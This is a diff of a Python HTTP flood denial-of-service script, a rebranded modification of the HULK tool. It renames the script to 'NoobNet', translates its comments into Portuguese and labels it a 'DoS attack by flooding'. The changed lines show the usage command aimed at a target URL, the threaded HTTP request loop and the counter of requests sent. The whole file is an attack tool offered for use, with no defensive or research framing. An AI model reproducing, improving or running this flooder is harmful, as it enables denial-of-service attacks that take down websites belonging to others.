@@ -1,9 +1,6 @@
 #! /usr/bin/env python
-#
 #----------------------------------------------------------------------------------------------
-# Modificacao do codigo HULK - HTTP Unbearable Load King - Barry Shteiman , version 1.0
-#
-#  
+#  Ataque por DoS negacao de servico inundacao versao 1.0.1
 # Nova Versao autores: Rafael Viana
 #                      Ramon Santos
 # 
@@ -71,7 +68,7 @@ def buildblock(size):
 
 def como_usar():
 	print '---------------------------------------------------'
-	print 'Usar: python BitTruncado.py <url>'
+	print 'Como usar: sudo python NoobNet.py <url>'
 	print '---------------------------------------------------'
 
 	
@@ -95,7 +92,7 @@ def httpcall(url):
 	try:
 			urllib2.urlopen(request)
 	except urllib2.HTTPError, e:
-			print e.code
+			#print e.code
 			set_flag(1)
 			print 'Response Code 500'
 			code=500
@@ -119,16 +116,16 @@ class HTTPThread(threading.Thread):
 		except Exception, ex:
 			pass
 
-# monitors http threads and counts requests
+# monitores http theread e contador de requests
 class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
 			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
+				print "%d Requests enviada" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- BiTruncado Attack Terminado --"
+			print "\n-- NoobNet Ataque Terminado --"
 
 #execute 
 if len(sys.argv) < 2:
@@ -139,7 +136,7 @@ else:
 		como_usar()
 		sys.exit()
 	else:
-		print "-- BiTruncado Force Ativado --"
+		print "-- NoobNet Force Ativado --"
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
